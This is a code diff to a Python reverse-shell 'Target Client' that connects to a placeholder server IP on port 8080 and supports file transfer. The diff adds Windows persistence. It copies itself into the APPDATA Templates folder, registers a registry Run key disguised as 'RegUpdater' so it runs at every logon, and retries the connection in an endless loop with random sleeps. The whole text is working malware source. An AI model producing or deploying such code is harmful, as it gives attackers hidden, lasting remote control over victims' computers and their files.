@@ -2,12 +2,27 @@
 import socket       
 import subprocess
 import os
+from shutil import copy
+import winreg as wreg
+from random import randrange
+from time import sleep
 
 class Client:
     ''' Target Client '''
     def __init__(self):
         self.SERVER_IP = '<SERVER-IP-ADDRESS>'
         self.SERVER_PORT = 8080
+        # Persistence I: copy script to random appdata location
+        self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
+        self.PATH = os.path.realpath(__file__)
+        copy(self.PATH, self.APPDATA_PATH)
+        # Persistence II: registry key pointing to the copied file
+        self.addRegkey()
+
+    def addRegkey(self):
+        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
+        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
+        key.Close()
 
     def transfer(self, s, path):
         ''' send transfer file '''
@@ -65,7 +80,14 @@ class Client:
 
 def main():
     c = Client()
-    c.connect()
+    # Persistence III: if can't connect to server sleep for 1 - 10 seconds
+    while True:
+        try:
+            if c.connect():
+                break
+        except:
+            sleep_for = randrange(1, 10)
+            sleep( sleep_for )
 
 if __name__ == "__main__":
     main()
